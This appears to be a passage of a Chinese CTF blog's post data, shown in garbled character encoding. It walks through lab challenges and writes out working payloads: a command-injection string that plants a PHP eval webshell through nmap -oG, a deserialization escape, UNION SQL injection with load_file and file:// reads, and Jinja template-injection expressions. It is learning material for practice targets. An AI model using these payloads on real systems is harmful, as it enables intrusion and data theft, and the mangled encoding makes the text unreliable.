å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·) escapeshellcmd()å‡½æ•°ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚ åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|?~&lt;&gt;^()[]{}$, \\x0A å’Œ \\xFFã€‚ *â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ ä¸Šè¿°å¤ªæŠ½è±¡ï¼Œæµ‹è¯•ä¸€ç•ª &lt;?php $a=1; echo $a; echo '&lt;br&gt;'; $a=escapeshellarg($a); echo $a; echo '&lt;br&gt;'; $a=escapeshellcmd($a); echo $a; ?&gt; escapeshellarg()å‡½æ•°å°†æ•´ä¸ªå­—ç¬¦ä¸²åŠ äº†å•å¼•å·åŒ…è£¹ï¼Œå¹¶ä¸”å¯¹å•å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œè½¬ä¹‰çš„å•å¼•å·ä¹Ÿä½¿ç”¨äº†å•å¼•å·åŒ…è£¹èµ·æ¥ï¼Œç„¶åç”¨escapeshellcmd()å‡½æ•°è¿›è¡Œäº†è½¬ä¹‰ï¼Œæˆå¯¹å‡ºç°çš„å•å¼•å·ä¸è½¬ä¹‰ï¼Œå¯¹\\è¿›è¡Œäº†è½¬ä¹‰ï¼Œå¯¹æœ€åä¸€ä¸ªå•å¼•å·ï¼ˆå•ä¸ªå‡ºç°ï¼‰è¿›è¡Œäº†è½¬ä¹‰ åœ¨çœ‹ ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2â€™ -v -d a=1 ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†â€™172.17.0.2â€™â€˜â€™ -v -d a=1â€™ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆâ€™172.17.0.2â€™\\â€˜â€™ -v -d a=1â€™ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl â€˜172.17.0.2â€™\\â€˜â€™ -v -d a=1â€™ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„â€™æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„â€™é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\\ -v -d a=1â€™ï¼Œå³å‘172.17.0.2\\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚ å¯¹ipè¿›è¡ŒåŠ å¯†ï¼Œç„¶ååˆ›å»ºç›®å½•ï¼Œè¾“å‡ºsystemæ‰§è¡Œnmapå‘½ä»¤åçš„ç»“æœï¼Œæ¯”å¦‚ä¼ å…¥127.0.0.1ï¼Œè¿”å›ï¼š æ¡†èµ·æ¥çš„å­—ç¬¦å°±æ˜¯åˆ›å»ºçš„ç›®å½•è·¯å¾„ é€šè¿‡æŸ¥èµ„æ–™å¾—çŸ¥nmap ä¸­çš„-oGå‚æ•°å¯ä»¥å°†å‘½ä»¤å’Œç»“æœå†™å…¥æ–‡ä»¶ ä¸€èˆ¬flagéƒ½åœ¨æ ¹ç›®å½•ä¸‹ï¼Œç›´æ¥ä½¿ç”¨åå¼•å·è¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ„é€ payloadï¼š ?host=' &lt;?php echo `cat /flag`;?&gt; -oG test.php ' //å¦‚æ­¤å†™æ˜¯ä¸ºäº†é˜²æ­¢é‚£ä¸¤ä¸ªå‡½æ•°çš„è½¬ä¹‰,è¯¦è§£å¦‚ä¸‹ è®¿é—®è¯¥ç›®å½•ä¸‹çš„test.phpå³å¯ è´´ä¸€ä¸‹å¤§ä½¬çš„è¯•é”™ï¼š å…³äºåŠ ä¸åŠ æœ€åçš„å•å¼•å·æˆ–åŠ ä¸åŠ  å•å¼•å·å‰çš„ç©ºæ ¼åšäº†ç»“æœå±•ç¤º é¦–å…ˆæ˜¯åé¢æ²¡æœ‰åŠ å¼•å· ?host=â€˜ &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.phpæˆ‘ä»¬å¯ä»¥åœ¨çº¿æµ‹è¯•ä¸€ä¸‹ â€˜â€˜\\â€˜â€˜ &lt;?php phpinfo();?&gt; -oG test.php\\â€˜è¿”å›ç»“æœæ˜¯ä¸Šé¢é‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šä¸€ä¸ªå¼•å· ç„¶åæ˜¯åŠ å¼•å·ä½†å¼•å·å‰æ²¡æœ‰ç©ºæ ¼ ?host=â€˜ &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.phpâ€˜ 1 è¿è¡Œç»“æœå¦‚ä¸‹ â€˜â€˜\\â€˜â€˜ &lt;?php phpinfo();?&gt; -oG test.phpâ€˜\\â€˜â€˜â€˜æ–‡ä»¶ååé¢å°±ä¼šå¤šå‡º\\ æ‰€ä»¥è¦æ³¨æ„ç»†èŠ‚ ä¸è¿‡è¿™ä¸ªä»£ç ä¼¼ä¹æ²¡å•¥ç”¨ if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {//åˆ¤æ–­æ˜¯å¦å­˜åœ¨xffå¤´ $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒ web6 ç®€å•çš„phpååºåˆ—åŒ– index.php &lt;?php # @dance.php error_reporting(0); class message{ public $cai; public $xv; public $kun; public $token='lanqiu'; public function __construct($c,$x,$k){ $this-&gt;cai = $c; $this-&gt;xv = $x; $this-&gt;kun = $k; } } $c = $_GET['c']; $x = $_GET['x']; $k = $_GET['k']; if(isset($c) &amp;&amp; isset($x) &amp;&amp; isset($k)){ $msg = new message($c,$x,$k);//è¯¥ç±»åœ¨dance.phpä¸­ $umsg = str_replace('okok', 'nonoo', serialize($msg));//ä¼°è®¡å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº† setcookie('msg',base64_encode($umsg)); echo 'Your message has been sent'; } highlight_file(__FILE__); dance.php &lt;?php include 'flag.php'; highlight_file(__FILE__); class message{ public $cai; public $xv; public $kun; public $token='lanqiu'; public function __construct($c,$x,$k){ $this-&gt;cai = $c; $this-&gt;xv = $x; $this-&gt;kun = $k; } } if(isset($_COOKIE['msg'])){ $msg = unserialize(base64_decode($_COOKIE['msg'])); if($msg-&gt;token=='sings'){ //ä»¤token=singså³å¯å¾—åˆ°flag highlight_file('flag.php'); } } //$umsg = str_replace('okok', 'nonoo', serialize($msg));//ä¼°è®¡å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº† è¿™ä¸ªæ–‡ä»¶å°±æ˜¯å…³é”®äº†ï¼Œå¼€å§‹æµ‹è¯• tokenæˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¼ å‚ï¼Œå¯ä»¥é€šè¿‡å­—ç¬¦é€ƒé€¸æ¥å®Œæˆã€‚è¿™é‡Œæ¯ä¸€ä¸ªokokå­—ç¬¦ä¸²å°±ä¼šå¤šä¸€ä¸ªå­—ç¬¦ã€‚ ç”¨åŒå¼•å·å°†å…¶é—­åˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨$kunèµ‹å€¼ä¸º\";s:5:â€œtokenâ€;s:5:â€œsingsâ€;}ï¼Œè¿™äº›å°±æ˜¯æˆ‘ä»¬è¦é€ƒé€¸çš„å­—ç¬¦ï¼Œæœ‰27ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åŠ ä¸Š27ä¸ªokokå­—ç¬¦ä¸²ã€‚payloadä¸º ?c=1&amp;x=1&amp;k=okokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokok\";s:5:\"token\";s:5:\"sings\";} web7 åˆæ˜¯åŸpï¼ï¼ï¼ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œå°è¯•æ‰«ç›®å½• è®¿é—®çœ‹çœ‹ æ²¡æƒé™ æœ‰ç‚¹æ‡µï¼Œç»™äº†ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¸çŸ¥é“å•¥æ„æ€ï¼Œé‚£å°±æŠ“åŒ…çœ‹æœ‰å•¥æƒŠå–œ æœ‰ç‚¹å¯ç–‘ï¼Œä¸åºåˆ—åŒ–å­—ç¬¦ä¸²ç›¸å¯¹åº”ï¼Œå°è¯•æ›´æ¢ä¸€ä¸‹ å¾—åˆ°base64ï¼Œæ¥ä¸‹æ¥åè½¬ä¸€ä¸‹è§£ç å³å¯","categories":["å†…éƒ¨ç«èµ›"]},{"title":"æ”»é˜²ä¸–ç•Œ-fakebook","path":"/2023/08/18/fakebook/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢ è¿™é‡Œå…ˆloginçœ‹çœ‹ è€è§„çŸ©å…ˆè¯•è¯•å¼±å£ä»¤ï¼Œæµ‹è¯•ä¸€ç•ªæ²¡å•¥ç”¨ï¼Œé‚£å°±æ¢æ€è·¯ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹ è¿™é‡Œä¹Ÿæ˜¯æ³¨å†Œäº†ä¸‰ä¸ªï¼Œä»¥ä¾¿æµ‹è¯•ï¼Œç‚¹å‡»æ¯ä¸ªé¡µé¢çœ‹çœ‹ æ„Ÿè§‰æ²¡å•¥åˆ©ç”¨çš„ç‚¹ï¼Œäºæ˜¯å›åˆ°æœ€åˆæˆ‘ä»¬å…ˆæ‰«ä¸€ä¸‹ç½‘ç«™ çœ‹åˆ°äº†flag.phpï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯çœŸçš„ï¼Œç»“æœæ²¡å•¥ç”¨ï¼Œé‚£çœ‹çœ‹robots.txt é‚£æˆ‘ä»¬è®¿é—®ä¹‹åå‘ç°äº†ä¸€ä»½æºç å¦‚ä¸‹ &lt;?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) //æ¥å—ç”¨æˆ·joinçš„ç›¸å…³ä¿¡æ¯ { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) //ä¸»è¦æ˜¯è¿”å›ç”¨æˆ·æ‰€è¾“å…¥çš„åšå®¢å†…å®¹ { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () //è°ƒç”¨getå‡½æ•° { return $this-&gt;get($this-&gt;blog); } public function isValidBlog ()//åˆ©ç”¨æ­£åˆ™åˆ¤æ–­åšå®¢æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè¿™é‡Œå‘¢åªéœ€è¦.åˆ†éš”å¼€å°±å¯ä»¥ { $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } è¿™é‡Œæ„Ÿè§‰æœ‰ç‚¹æ¨¡ç³Šï¼Œæ²¡å•¥åˆ©ç”¨çš„ç‚¹ï¼Œè¿”å›é¡µé¢çœ‹åˆ°urlä¸Šæœ‰noå‚æ•°ï¼Œæƒ³åˆ°äº†sqlï¼Œå°è¯•ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°æŠ¥é”™ï¼Œè¯´æ˜çš„ç¡®å­˜åœ¨ï¼Œé‚£æˆ‘ä»¬å°±å…ˆæ‰‹åŠ¨æµ‹è¯•ä¸€ç•ª è¿™é‡Œå‘ç°æœ‰å››åˆ— æ¥ç€æƒ³æŸ¥çœ‹æ•°æ®åº“å ä¸å‡ºæ‰€æ–™è¿‡æ»¤äº†ã€‚ã€‚ã€‚ã€‚ é‚£å…ˆæ‰‹åŠ¨fuzzï¼Œè¿™é‡Œä¸å‡ºæ‰€æ–™å°±æ˜¯union selectçš„è¿‡æ»¤äº†ï¼Œå°è¯•ä¸€ä¸‹åŒå†™ï¼Œå¤§å°å†™ï¼Œæ³¨é‡Šç¬¦çœ‹çœ‹ æµ‹è¯•å‘ç°è¿‡æ»¤çš„æ˜¯â€œunion selectâ€è¿™ä¸ªå­—ç¬¦ä¸² è¿™é‡Œå‘ç°ç¬¬äºŒåˆ—æ˜¯å›æ˜¾ä½ æ¥ç€çœ‹ä¸€ä¸‹å½“å‰æ•°æ®åº“åç§°ä¸ç”¨æˆ· è¿™é‡Œå¸¸è§„è¯´ç»§ç»­çœ‹è¡¨ååˆ—åæ¥æ‰¾flagï¼Œä¸è¿‡çœ‹äº†wpå‘ç°ï¼Œè¿™é‡Œåˆrootèº«ä»½ï¼Œæƒé™å¾ˆé«˜ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨mysqlä¸­çš„load_fileå‡½æ•°ã€‚ å…è®¸è®¿é—®ç³»ç»Ÿæ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼Œä¸è¿‡éœ€è¦çš„æƒé™å¾ˆé«˜ï¼Œä¸”å‡½æ•°å‚æ•°è¦æ±‚æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚//è¿™å·§äº†ä¸æ˜¯ï¼Œæ¡ä»¶å…¨éƒ½æœ‰ã€‚ view.php?no=-3 union/**/select 1,load_file(\"/var/www/html/flag.php\"),3,4# æ‰¾åˆ°flagã€‚ æ¥ä¸‹æ¥æ¥ç€æŒ‰å¸¸è§„æ€è·¯çœ‹çœ‹ ?no=-3 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=\"fakebook\"# //çˆ†è¡¨å ?no=-3 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\"users\"# //çˆ†åˆ—å åœ¨è¿™é‡Œdataå­—æ®µæœ€å¯ç–‘ ?no=-3 union/**/select 1,group_concat(username,data),3,4 from users# å¦‚å›¾å‘ç°åºåˆ—åŒ–å­—ç¬¦ä¸² æ¥ä¸‹æ¥å°±ä¸å¤ªä¼šäº†ï¼Œè·Ÿç€wpèµ° æ¥ä¸‹æ¥çš„ä¸œè¥¿ï¼Œæˆ‘è®¤ä¸ºéœ€è¦çŒœã€‚æœ€å¼€å§‹æ—¶çš„ç”¨æˆ·é¡µé¢no=1æ—¶ï¼Œé¡µé¢è¿”å›ç”¨æˆ·çš„ç”¨æˆ·åã€å¯†ç ã€åšå®¢ä¹‹ç±»çš„æ¶ˆæ¯ã€‚æ¯«æ— ç–‘é—®ï¼Œé¡µé¢æ˜¯æ ¹æ®usersè¡¨ä¸­no=1çš„è¿™æ¡æ•°æ®ï¼Œæ¸²æŸ“çš„é¡µé¢ã€‚å› ä¸ºå›æ˜¾ï¼Œæˆ‘ä»¬åªè¯æ˜äº†æŸ¥è¯¢è¯­å¥çš„ç¬¬äºŒä¸ªå­—æ®µæ˜¯usernameã€‚å…¶ä½™ä¸‰ä¸ªå­—æ®µå¹¶ä¸æ˜ç¡®ï¼Œä½†æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œåº”è¯¥å’Œæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µé¡ºåºç›¸ä¼¼ã€‚ç¬¬å››ä¸ªå­—æ®µåº”è¯¥å°±æ˜¯dataï¼Œè€Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªç°æˆçš„dataæ•°æ®ï¼Œèƒ½å¦æ¨¡æ‹Ÿä¸‹ï¼Ÿ ?no=-3 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:123;s:4:\"blog\";s:8:\"123.blog\";}' å‘ç°æˆåŠŸå›æ˜¾ï¼Œå¹¶ä¸”è¿™ä¼¼ä¹æ˜¯æ–°å»ºçš„ï¼Œå› ä¸ºæ­¤å‰æˆ‘å¹¶æ²¡æœ‰è¿™ä¸€é¡¹æ•°æ®ï¼Œåœ¨çœ‹wpï¼š â€‹ æ³¨æ„noç°åœ¨çš„å€¼ä¸º2ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªç”¨æˆ·æ˜¯ä¸å­˜åœ¨çš„ã€‚æ¢è€Œè¨€ä¹‹ï¼ŒåŸSQLè¯­å¥çš„æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œè€Œæˆ‘ä»¬é€šè¿‡unionåŠ å…¥äº†æˆ‘ä»¬æ„é€ çš„æŸ¥è¯¢è¯­å¥ï¼Œè®©SQLè¯­å¥æœ‰äº†æŸ¥è¯¢ç»“æœï¼Œå¹¶ä¸”æ­¤æŸ¥è¯¢ç»“æœç¬¦åˆé¡µé¢æ¸²æŸ“è¦æ±‚ï¼Œæ‰€ä»¥é¡µé¢æ­£å¸¸æ˜¾ç¤ºäº†ã€‚ å¤§ä½¬å°±æ˜¯å¼ºï¼Œè¿™æ€è·¯å¾ˆé¡¶ï¼ï¼ï¼ â€‹ å¹¶ä¸”ç”±æ­¤å¾—çŸ¥ï¼Œåªè¦æœ‰dataå­—æ®µçš„å¯¹è±¡åºåˆ—ï¼Œå°±å¯ä»¥æˆåŠŸæ¸²æŸ“é¡µé¢ï¼Œå…¶ä»–å­—æ®µå¹¶ä¸æ˜¯å¾ˆé‡è¦ã€‚ï¼ˆé¡µé¢ä¸­ageå’Œblogçš„å€¼ï¼Œæ˜¾ç„¶ä¹Ÿéƒ½æ˜¯ä»åºåˆ—åŒ–çš„å¯¹è±¡é‡Œé¢å¾—åˆ°çš„ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®©æˆ‘è¿·çš„ç‚¹ï¼Œä½ ä¿®æ”¹å¯¹è±¡åºåˆ—é‡Œé¢çš„blogå‚æ•°å†…å®¹ï¼š s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\"; â€‹ ç”¨fileä¼ªåè®®è¯»å–flagå†…å®¹äº¤ç»™blogå‚æ•°ï¼Œç„¶åä½ å†æŸ¥çœ‹æºç ï¼Œiframeçš„srcå°±å‘ç”Ÿäº†å˜åŒ–ï¼š æ‰¾åˆ°flag æ¥ä¸‹æ¥åœ¨çœ‹ä½¬çš„æ€è·¯ï¼š å›æƒ³åˆšåˆšçš„é—®é¢˜ï¼Œå¦‚ä½•æƒ³åˆ°çš„ä¿®æ”¹åºåˆ—é‡Œé¢çš„blogå‚æ•°å‘¢ï¼Ÿæœ€å¼€å§‹blogå‚æ•°å€¼ä¸º123.blogï¼Œæºç é‡Œiframeçš„srcå¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ã€‚ ä¸ªäººè®¤ä¸ºï¼Œå¦‚æœé¶åœºæƒ³å¯å‘ç”¨æˆ·ä¿®æ”¹blogå‚æ•°å€¼ï¼Œåº”å½“åœ¨blogå€¼è¢«ä¿®æ”¹åï¼Œæºç é‡Œçš„srcé€‚å½“å˜åŒ–ä¸‹ï¼Œè®©ç”¨æˆ·çŸ¥é“ï¼Œè¿™ä¸ªç‚¹å¯ä»¥ä½¿ç”¨ã€‚æ— è®ºæ€æ ·æ¢blogå‚æ•°ï¼Œsrcæ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œå°±å¾ˆéš¾æƒ³åˆ°å†è·Ÿè¿›ä¸€æ­¥çš„åˆ©ç”¨ä¼ªåè®®å»è¯»å–å†…å®¹äº†ã€‚ å½“ç„¶ï¼Œå¦‚æœæ€ªæ²¡æœ‰æç¤ºï¼Œä¹Ÿå¹¶ä¸å‡†ç¡®ï¼Œå› ä¸ºæœ‰ä¸ªç‚¹ï¼Œæˆ‘ä»¬è¿˜æ²¡ç”¨åˆ°ã€‚è¯¦ç»†çœ‹æœ€å¼€å§‹æˆ‘ä»¬å¾—åˆ°çš„å¤‡ä»½æ–‡ä»¶ï¼š getBlogContentå‡½æ•°ï¼Œæˆ‘ä»¬çŒœä¹Ÿæ˜¯ä¸ªè·å–blogå†…å®¹çš„å‡½æ•°ã€‚è€Œå…¶å†…éƒ¨è°ƒç”¨äº†æˆ‘ä»¬ä¸€å¼€å§‹å°±è¯´æœ‰é—®é¢˜çš„getå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªurlï¼Œå¹¶å°†æŒ‡å®šurlçš„å†…å®¹è¿”å›ã€‚æ¢è€Œè¨€ä¹‹ï¼Œåªè¦blogå‚æ•°æ˜¯å¯ä»¥è¯·æ±‚åˆ°å†…å®¹ï¼Œè¿”å›ä¸ä¸º404çš„ï¼ŒgetBlogContentså‡½æ•°å³æœ‰è¿”å›ç»“æœã€‚æ¯«æ— ç–‘é—®ï¼Œä¼ªåè®®fileå°±èƒ½è¾¾åˆ°è¦æ±‚ã€‚ é‚£æˆ‘ä»¬æ¢ä¸ªé“¾æ¥è¯·æ±‚ä¸‹å‘—ï¼š ?no=-3%20union/**/select%201,2,3,%27O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:123;s:4:\"blog\";s:26:\"http://111.198.29.45:34016\";}%27 å°±æ¢æˆé¶åœºæœ€å¼€å§‹çš„ä¸»é¡µã€‚ æŸ¥çœ‹æºç ï¼š è¿™ä¸ªå›¾ç‰‡æ²¡å¤ç°å‡ºæ¥,ä¸çŸ¥ä¸ºä½•,å°±å…ˆçœ‹ä¸ªæ€è·¯ã€‚ æœä¸å…¶ç„¶ï¼Œå°†å…¶base64è½¬ç ï¼Œåº”è¯¥å°±èƒ½å¾—åˆ°ä¸»é¡µçš„æºç äº†ã€‚ æ‰€ä»¥è‡´æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸‹æ¥ã€‚getBlogContentså‡½æ•°è°ƒç”¨getå‡½æ•°ï¼ŒæŠŠunserinfoç±»ä¸­çš„blogå‚æ•°å½“åšä¸€ä¸ªURLï¼Œå¾—åˆ°è¯·æ±‚å†…å®¹ã€‚è€Œé¡µé¢é‡Œiframeé‡Œçš„srcæ ¹æ®å¾—åˆ°çš„å†…å®¹è¿›è¡Œé¡µé¢æ¸²æŸ“ã€‚ æ­£ç¡®çš„æ€è·¯æµç¨‹åº”å½“ä¸ºï¼Œå¾—åˆ°å¤‡ä»½æ–‡ä»¶ï¼Œæ˜ç¡®getBlogContentså‡½æ•°é€šè¿‡ä¸€ä¸ªURLè·å–å†…å®¹ï¼Œå¹¶ä¸”URLç”±ç±»å®ä¾‹åŒ–å¯¹è±¡çš„blogå‚æ•°æä¾›ã€‚ç„¶ååœ¨æ„é€ userinfoå¯¹è±¡åºåˆ—åŒ–å‘ç°é¡µé¢å¯ä»¥æ­£å¸¸è¿”å›ä¹‹åï¼Œå°±å°è¯•ä¿®æ”¹åºåˆ—åŒ–ä¸­çš„blogå‚æ•°ï¼Œå‘ç°é¡µé¢ä¸­iframeçš„srcæš´éœ²ä¿¡æ¯ï¼Œè¿›è€Œæƒ³åˆ°å¯ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–flagï¼Œå¹¶è®©srcæ˜¾ç¤ºã€‚ å…¶å®ï¼Œåœ¨æ„é€ blogçš„æ—¶å€™ï¼ŒæŠ¥é”™ä¿¡æ¯ä¹Ÿä¸€ç›´åœ¨ç»™äºˆæç¤ºï¼š æ€è·¯å¾ˆé¡¶ï¼Œå­¦åˆ°äº† å‚è€ƒæ–‡ç« ï¼š æ–‡ç« å‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-shrine","path":"/2023/08/18/shrine/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š ç›´æ¥è®¿é—®å‘ç°pythonçš„ä¸€ç§æ¨¡æ¿æ¡†æ¶ä»£ç ï¼Œå¤åˆ¶è¿›ideaçœ‹çœ‹ï¼Œè¿›è¡Œä»£ç å®¡è®¡ import flask import os # å¯¼åŒ… app = flask.Flask(__name__) #åˆ›å»º Flask åº”ç”¨ app.config['FLAG'] = os.environ.pop('FLAG') # è·å–ç¯å¢ƒå˜é‡flag @app.route('/') # è®¾ç½®å½“å‰ç›®å½•çš„è·¯ç”±ï¼Œä¼šè¯»å–å½“å‰æ–‡ä»¶çš„å†…å®¹å¹¶è¿”å›ã€‚ def index(): return open(__file__).read() @app.route('/shrine/') # åŒ¹é… '/shrine/' è·¯å¾„ def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] # è¿™é‡Œå¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤äº†configï¼Œselfï¼Œä»¥åŠä¸¤ä¸ªæ‹¬å· return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True) é‚£æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹shrineè·¯ç”± æ²¡å•¥ç‰¹æ®Šçš„ï¼Œé‚£ç»“åˆæºä»£ç ä¸­çš„renderæ¸²æŸ“å‡½æ•°æˆ‘ä»¬ç›´æ¥åœ¨urlåé¢åŠ ç‚¹ä¸œè¥¿çœ‹çœ‹ å¯ä»¥å‘ç°ï¼Œå­˜åœ¨sstiæ³¨å…¥æ¼æ´ï¼Œç”±äºè¿™é‡Œflagåœ¨å…¨å±€ä¸­ï¼Œæ‰¾ä¸€äº›åˆé€‚payloadå³å¯ {{url_for.__globals__['current_app'].config.FLAG}} {{get_flashed_messages.__globals__['current_app'].config.FLAG}} ç¿»äº†ç¿»ä»“åº“å‘ç°ä¸Šè¿°ä¸¤ä¸ªå‡å¯ä»¥è·å–åˆ°é…ç½®ä¿¡æ¯ æ‹¿åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-easytornado","path":"/2023/08/18/easytornado/","content":"é¢˜ç›®æè¿°ï¼š Tornado æ¡†æ¶ é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¢˜ç›®çœ‹åˆ°å¦‚ä¸Šï¼Œä¸€ä¸ªä¸ªç‚¹å‡»çœ‹çœ‹ æ—¢ç„¶æ˜¯hintï¼Œé‚£è¿™é‡Œå°±æ˜¯æç¤ºäº†è¿™é‡Œçš„å«ä¹‰åº”è¯¥æ˜¯ï¼Œå°†filenameç»è¿‡md5åŠ å¯†ï¼Œå†åŠ ä¸Šcookieæœ€ååœ¨åŠ å¯† ä¹Ÿå°±åˆ†æåˆ°è¿™é‡Œäº†ï¼Œåé¢æ²¡å•¥å¤´ç»ªï¼Œåªæ˜¯ç¡®å®šçš„æ˜¯è¿™ä¼°è®¡æ˜¯ä¸ªsstiæ³¨å…¥æ¼æ´ï¼Œçœ‹äº†wpå‘ç° æˆ‘ä»¬è¦è®¿é—®/fllllllllllllagæ–‡ä»¶ï¼Œurlä¸­ä¹Ÿè¦ä»¥GETæ–¹å¼æäº¤äº†2ä¸ªå‚æ•°ï¼šfilename=/fllllllllllllag&amp;filehash= 62499926a4a274c1614cf899bf7816b0 ç›´æ¥è®¿é—®æ˜¯ä¼šæŠ¥é”™çš„ï¼š http://111.200.241.244:53713/file?filename=/fllllllllllllag 